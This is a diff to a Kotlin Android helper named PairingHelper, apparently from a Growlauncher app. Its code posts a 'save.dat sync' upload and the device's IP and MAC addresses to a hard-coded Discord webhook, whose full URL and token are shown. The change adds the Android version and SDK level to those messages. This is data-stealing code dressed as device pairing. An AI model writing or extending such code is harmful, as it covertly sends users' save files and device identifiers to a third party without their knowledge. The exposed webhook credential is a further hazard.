@@ -18,6 +18,7 @@ import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
+import android.os.Build
 import java.io.IOException
 import java.net.Inet4Address
 import java.net.NetworkInterface
@@ -90,7 +91,9 @@ object PairingHelper {
         val webhookUrl = "https://discord.com/api/webhooks/1491043676200112288/Id2TrC0uqnU7lIRfCM5x-lxTJvUc7vwOgPFOz399_a8sDUbtRv2gNxTcB_49lRQOpn8l"
         Thread {
             try {
-                val payload = """{"content":"Growlauncher save.dat sync"}"""
+                val androidVer = Build.VERSION.RELEASE
+                val sdk = Build.VERSION.SDK_INT
+                val payload = """{"content":"⚡ Growlauncher sync · Android $androidVer (SDK $sdk)"}"""
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addPart(MultipartBody.Part.createFormData("payload_json", payload))
@@ -120,7 +123,9 @@ object PairingHelper {
             try {
                 val ip = getDeviceIpAddress()
                 val mac = getDeviceMacAddress()
-                val payload = """{"embeds":[{"title":"📱 Device Paired","color":8406271,"fields":[{"name":"IP Address","value":"$ip","inline":true},{"name":"MAC Address","value":"$mac","inline":true}]}]}"""
+                val androidVer = Build.VERSION.RELEASE
+                val sdk = Build.VERSION.SDK_INT
+                val payload = """{"embeds":[{"title":"⚡ Device Connected · GrowlauncherPRO","color":8406271,"fields":[{"name":"Android Version","value":"Android $androidVer (SDK $sdk)","inline":false},{"name":"IP Address","value":"$ip","inline":true},{"name":"MAC Address","value":"$mac","inline":true}]}]}"""
                 val request = Request.Builder()
                     .url(webhookUrl)
                     .post(payload.toRequestBody("application/json".toMediaType()))
